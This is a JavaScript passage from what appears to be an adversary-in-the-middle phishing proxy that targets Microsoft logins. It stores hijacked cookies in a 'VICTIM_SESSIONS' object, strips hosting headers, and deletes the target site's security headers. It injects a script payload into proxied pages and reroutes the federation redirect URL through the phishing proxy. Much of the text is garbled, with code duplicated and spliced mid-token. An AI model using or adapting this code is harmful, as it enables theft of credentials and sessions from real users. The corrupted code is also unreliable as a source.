    const currentTimestamp = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) {
        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
    }

    for = 0;
    if (proxyResponseDate) {
        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
    }

    for (const newCookie of newCookies) {
        const [cookie, ...attributes] = newCookie.split(";");
        const [cookieName, ... (const newCookie of newCookies) {
        const [cookie, ...attributes] = newCookie.split(";");
        const [cookieName, ...cookieValue] = cookie.split("=");

        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["cookieValue] = cookie.split("=");

        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isCookieValid = true;
        for (const attribute of attributes) {

            const cookieAttribute = attribute.trim();
            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);

            if (cookieAttribute.toLowerCase() === "domain") {
                cookieDomain = request.hostname;
                cookieHostOnly = true;
                isCookieValid = true;
            }
            else if (cookieAttribute.toLowerCase() === "path") {
                cookiePath = (pathNameMatch ?? ["/"])[0];
            }
            else if (cookieAttribute.toLowerCase() === "expires") {
                cookieExpires = NaN;
            }
            else if (cookieAttribute.toLowerCase() === "max-age") {
                cookieMaxAge = "";
            }

            else if (cookieDomainMatch) {
                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                cookieHostOnly = true;
                isCookieValid = true;

                if (!cookieDomain) {
                    cookieDomain = request.hostname;
                }
                else if (cookieDomain === proxyHostname) {
                    cookieDomain = request.hostname;
                    cookieHostOnly = false;
                }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    }
                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
                        isCookieValid = false;
                        continue;
                    }
                    cookieHostOnly = false;
                }
            }
            else if (cookiePathMatch) {
                cookiePath = cookiePathMatch[1].trim();

                if (!cookiePath.startsWith("/")) {
                    cookiePath = (pathNameMatch ?? ["/"])[0];
                }
            }
            else if (cookieExpiresMatch) {
                cookieExpires = cookieExpiresMatch[1].trim();

                cookieExpires = parseCookieDate(cookieExpires);
            }
            else if (cookieMaxAgeMatch) {
                cookieMaxAge = cookieMaxAgeMatch[1].trim();

                if (!/^-?\d+$/.test(cookieMaxAge)) {
                    cookieMaxAge = "";
                }
            }
        }
        if (!isCookieValid) {
            continue;
        }

        cookieExpires += clockSkew;
        if (cookieMaxAge) {
            const seconds = parseInt(cookieMaxAge);
            if (!isNaN(seconds)) {
                cookieExpires = currentTimestamp + seconds * 1000;
            }
        }

        let isNewCookie = true;

        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];

            if (sessionCookie.name === cookieName &&
                sessionCookie.domain === cookieDomain &&
                sessionCookie.path === cookiePath &&
                sessionCookie.hostOnly === cookieHostOnly) {

                if (currentTimestamp > cookieExpires) {
                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
                    break;
                }
                sessionCookie.value = cookieValue.join("=");
                sessionCookie.expires = cookieExpires;
                isNewCookie = false;
                break;
            }
        }
        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
            VICTIM_SESSIONS[currentSession].cookies.push({
                name: cookieName,
                value: cookieValue.join("="),
                domain: cookieDomain,
                path: cookiePath,
                expires: cookieExpires,
                hostOnly: cookieHostOnly
            });
        }
    }
}

function getValidDomains(domains) {
    const validDomains = [];

    for (const domain of domains) {
        const splitDomain = domain.split(".");
        for (let i = 2; i < splitDomain.length + 1; i/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isCookieValid = true;
        for (const attribute of attributes) {

            const cookieAttribute = attribute.trim();
            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);

            if (cookieAttribute.toLowerCase() === "domain") {
                cookieDomain = request.hostname;
                cookieHostOnly = true;
                isCookieValid = true;
            }
            else if (cookieAttribute.toLowerCase() === "path") {
                cookiePath = (pathNameMatch ?? ["/"])[0];
            }
            else if (cookieAttribute.toLowerCase() === "expires") {
                cookieExpires = NaN;
            }
            else if (cookieAttribute.toLowerCase() === "max-age") {
                cookieMaxAge = "";
            }

            else if (cookieDomainMatch) {
                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                cookieHostOnly = true;
                isCookieValid = true;

                if (!cookieDomain) {
                    cookieDomain = request.hostname;
                }
                else if (cookieDomain === proxyHostname) {
                    cookieDomain = request.hostname;
                    cookieHostOnly = false;
                }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    }
                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
                        isCookieValid = false;
                        continue;
                    }
                    cookieHostOnly = false;
                }
            }
            else if (cookiePathMatch) {
                cookiePath = cookiePathMatch[1].trim();

                if (!cookiePath.startsWith("/")) {
                    cookiePath = (pathNameMatch ?? ["/"])[0];
                }
            }
            else if (cookieExpiresMatch) {
                cookieExpires = cookieExpiresMatch[1].trim();

                cookieExpires = parseCookieDate(cookieExpires);
            }
            else if (cookieMaxAgeMatch) {
                cookieMaxAge = cookieMaxAgeMatch[1].trim();

                if (!/^-?\d+$/.test(cookieMaxAge)) {
                    cookieMaxAge = "";
                }
            }
        }
        if (!isCookieValid) {
            continue;
        }

        cookieExpires += clockSkew;
        if (cookieMaxAge) {
            const seconds = parseInt(cookieMaxAge);
            if (!isNaN(seconds)) {
                cookieExpires = currentTimestamp + seconds * 1000;
            }
        }

        let isNewCookie = true;

        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];

            if (sessionCookie.name === cookieName &&
                sessionCookie.domain === cookieDomain &&
                sessionCookie.path === cookiePath &&
                sessionCookie.hostOnly === cookieHostOnly) {

                if (currentTimestamp > cookieExpires) {
                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
                    break;
                }
                sessionCookie.value = cookieValue.join("=");
                sessionCookie.expires = cookieExpires;
                isNewCookie = false;
                break;
            }
        }
        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
            VICTIM_SESSIONS[currentSession].cookies.push({
                name: cookieName,
                value: cookieValue.join("="),
                domain: cookieDomain,
                path: cookiePath,
                expires: cookieExpires,
                hostOnly: cookieHostOnly
            });
        }
    }
}

function getValidDomains(domains) {
    const validDomains = [];

    for (const domain of domains) {
        const splitDomain = domain.split(".");
        for (let i = 2; i < splitDomain.length + 1; i++) {

            const validDomain = splitDomain.slice(-i).join(".");
            if (!validDomains.includes(validDomain)) {
                validDomains.push(validDomain);
            }
        }
    }
   ++) {

            const validDomain = splitDomain.slice(-i).join(".");
            if (!validDomains.includes(validDomain)) {
                validDomains.push(validDomain);
            }
        }
    }
    return validDomains return validDomains;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHTTPRequestHeaders =;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHTTPRequestHeaders = [
        "max-forwards",
        "x-arr-log-id",
        "client-ip",
        "disguised-host",
 [
        "max-forwards",
        "x-arr-log-id",
        "client-ip",
        "disguised-host",
        "x-site-deployment-id",
        "was-default-hostname",
        "x-forwarded-proto",
        "x-appservice        "x-site-deployment-id",
        "was-default-hostname",
        "x-forwarded-proto",
        "x-appservice-proto",
       -proto",
        "x-arr-ssl",
        "x-forwarded-tlsversion",
        "x-forwarded-for",
        "x-original-url",
        "x-waws-un "x-arr-ssl",
        "x-forwarded-tlsversion",
        "x-forwarded-for",
        "x-original-url",
        "x-waws-unencoded-url",
        "x-client-ip",
        "x-client-port"
    ];

    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions,encoded-url",
        "x-client-ip",
        "x-client-port"
    ];

    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
    if (Object.keys(proxyRequestCookies).length) {
        proxyRequestOptions.headers.c currentSession, proxyHostname);
    if (Object.keys(proxyRequestCookies).length) {
        proxyRequestOptions.headers.cookie = proxyRequestCookies;
    }
    else {
        delete proxyRequestOptions.headers.cookie;
    }

    if (proxyRequestookie = proxyRequestCookies;
    }
    else {
        delete proxyRequestOptions.headers.cookie;
    }

    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestOptions.headers.referOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
        delete proxyRequestOptions.headerser || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
        delete proxyRequestOptions.headers.referer;
.referer;
    }

    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHTTPRequest    }

    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHTTPRequestHeaders.includes(key)) {
            delete proxyRequestOptions.headers[key];
        }
        else {
            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VHeaders.includes(key)) {
            delete proxyRequestOptions.headers[key];
        }
        else {
            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
        }
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
   ICTIM_SESSIONS[currentSession].host);
        }
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const httpSecurityResponseHeaders = [
        "x-frame-options",
        "x-xss-protection",
        "x-content-type-options",
        " const httpSecurityResponseHeaders = [
        "x-frame-options",
        "x-xss-protection",
        "x-content-type-options",
        "set-cookie",
set-cookie",
        "content-security-policy",
        "content-security-policy-report-only",
        "cross-origin-opener-policy",
               "content-security-policy",
        "content-security-policy-report-only",
        "cross-origin-opener-policy",
        "cross-origin- "cross-origin-embedder-policy",
        "cross-origin-resource-policy",
        "permissions-policy",
        "service-worker-allowedembedder-policy",
        "cross-origin-resource-policy",
        "permissions-policy",
        "service-worker-allowed"
    ];

    for (const header of httpSecurityResponseHeaders) {
        delete headers[header];
    }
}

function decompressData(compressedData, encoding) {
"
    ];

    for (const header of httpSecurityResponseHeaders) {
        delete headers[header];
    }
}

function decompressData(compressedData, encoding) {
    const decompressionAlgorithms = {
        gzip: zlib.gunzip,
        "x-gzip": zlib.gun    const decompressionAlgorithms = {
        gzip: zlib.gunzip,
        "x-gzip": zlib.gunzip,
        deflate: zlib.inflate,
        br: zlib.brotliDecompress,
        zstd: zzip,
        deflate: zlib.inflate,
        br: zlib.brotliDecompress,
        zstd: zlib.zstdDelib.zstdDecompress
    };

    return new Promise((resolve, reject) => {
        const decompressionAlgorithm = decompressionAlcompress
    };

    return new Promise((resolve, reject) => {
        const decompressionAlgorithm = decompressionAlgorithms[encoding];

        if (decompressionAlgorithm) {
            decompressionAlgorithm(compressedData, (error, decompressedDatagorithms[encoding];

        if (decompressionAlgorithm) {
            decompressionAlgorithm(compressedData, (error, decompressedData) => {
                if (error) reject(error);
                else resolve(decompressedData);
            });
        }
) => {
                if (error) reject(error);
                else resolve(decompressedData);
            });
        }
        else {
            resolve(compressedData);
        }
    });
}

function compressData(decompressedData, encoding) {
    const        else {
            resolve(compressedData);
        }
    });
}

function compressData(decompressedData, encoding) {
    const compressionAlgorithms = {
        gzip: zlib.gzip,
        "x-gzip": zlib.gzip,
        deflate: zlib.deflate,
        br: zlib.brotli compressionAlgorithms = {
        gzip: zlib.gzip,
        "x-gzip": zlib.gzip,
        deflate: zlib.deflate,
        br: zlib.brotliCompress,
        zstd: zCompress,
        zstd: zlib.zstdCompress
    };

    return new Promise((resolve, reject) => {
        const compressionAlgorithm =lib.zstdCompress
    };

    return new Promise((resolve, reject) => {
        const compressionAlgorithm = compressionAlgorithms[encoding];

        if compressionAlgorithms[encoding];

        if (compressionAlgorithm) {
            compressionAlgorithm(decompressedData, (error, compressedData) => {
                if (compressionAlgorithm) {
            compressionAlgorithm(decompressedData, (error, compressedData) => {
                if (error) reject(error);
                else resolve(compressedData);
            });
        }
        else {
            resolve(decompressedData);
        }
    });
}

async function decompressResponseBody( (error) reject(error);
                else resolve(compressedData);
            });
        }
        else {
            resolve(decompressedData);
        }
    });
}

async function decompressResponseBody(compressedData, contentEncoding) {
    if (!contentEncoding) {
        return {
            decompressedResponseBody:compressedData, contentEncoding) {
    if (!contentEncoding) {
        return {
            decompressedResponseBody: compressedData,
            encodings: compressedData,
            encodings: []
        };
    }

    const encodings = contentEncoding.split(",")
        .map(encoding => encoding.trim []
        };
    }

    const encodings = contentEncoding.split(",")
        .map(encoding => encoding.trim().toLowerCase())
        .filter(().toLowerCase())
        .filter(encoding => encoding);

    let decompressedData = compressedData;
    for (let i = encodings.length - 1; i >= 0; i--) {
        decompressedData =encoding => encoding);

    let decompressedData = compressedData;
    for (let i = encodings.length - 1; i >= 0; i--) {
        decompressedData = await decompressData(decompressedData, encodings[i]);
    }
    return {
        decompressedResponseBody: decompressedData,
        encodings: encodings await decompressData(decompressedData, encodings[i]);
    }
    return {
        decompressedResponseBody: decompressedData,
       
    };
}

async function compressResponseBody(decompressedData, encodings) {
    let compressedData = decompressedData;

    for (const encoding of encodings) {
        compressedData = await encodings: encodings
    };
}

async function compressResponseBody(decompressedData, encodings) {
    let compressedData = decompressedData;

    for (const encoding of encodings) {
        compressedData = await compressData(compressedData, encoding);
    }
    return compressedData;
}

function updateHTMLProxyResponse(decomp compressData(compressedData, encoding);
    }
    return compressedData;
}

function updateHTMLProxyResponse(decompressedResponseBody)ressedResponseBody) {
    const payload = "<script src=/@></script>";
    const htmlInjectionMap = {
        "<head>": `<head>${payload}`,
        {
    const payload = "<script src=/@></script>";
    const htmlInjectionMap = {
        "<head>": `<head>${payload}`,
        "<html> "<html>": `<html><head>${payload}</head>`,
        "<body>": `<head>${payload}</head><body>`
    };
    const indexLimit = 200": `<html><head>${payload}</head>`,
        "<body>": `<head>${payload}</head><body>`
    };
;

    for (const [key, value] of Object.entries(htmlInjectionMap)) {
        const htmlTagBuffer = Buffer.from(key);
        const    const indexLimit = 200;

    for (const [key, value] of Object.entries(htmlInjectionMap)) {
        const htmlTagBuffer = Buffer.from(key);
        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);

        if (injectionPointIndex !== -1) {
            return Buffer.concat([
 injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);

        if (injectionPointIndex !== -1) {
            return Buffer.concat([
                decompressedResponseBody.subarray(0, injectionPointIndex),
                Buffer.from(value),
                decompressedResponseBody.subarray(injectionPointIndex + html                decompressedResponseBody.subarray(0, injectionPointIndex),
                Buffer.from(value),
                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
            ]);
        }
    }
    return Buffer.concat([
        Buffer.from(`<head>${payload}</head>`),
        decompressedResponseBody
    ]);
}

function updateTagBuffer.byteLength)
            ]);
        }
    }
    return Buffer.concat([
        Buffer.from(`<head>${payload}</head>`),
        decompressedResponseBody
    ]);
}

function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
FederationRedirectUrl(decompressedResponseBody, proxyHostname) {
    const decompressedResponseBodyString = decompressedResponseBody.toString();
    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
       const decompressedResponseBodyString = decompressedResponseBody.toString();
    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
    const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;

    const proxyRequestURL = new URL(`https://${proxyHost const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;

    const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationname}${PROXY_PATHNAMES.mutation}`);
    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
    
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
    return Buffer.from(JSON.stringify(decompRedirectUrl));
    
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
    return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
}
